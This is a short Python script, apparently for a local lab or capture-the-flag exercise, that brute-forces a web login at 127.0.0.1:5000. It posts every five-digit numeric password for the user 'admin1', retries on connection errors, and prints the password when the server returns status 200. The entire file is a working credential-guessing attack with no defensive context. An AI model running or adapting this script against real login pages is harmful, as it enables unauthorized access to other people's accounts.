import requests
import time

url = "http://127.0.0.1:5000"
session = requests.Session()
current_iteration = 0

while current_iteration < 100000:

    password = str(current_iteration).zfill(5)
    print(password)

    try:
        response = session.post(url, data={"username": "admin1", "password": password})
    except requests.exceptions.ConnectionError:
        time.sleep(0.05)
        print("Request failed, retrying")
        continue

    if response.status_code == 200:
        print(response.text)
        print("password: " + password)
        break
    else:
        current_iteration += 1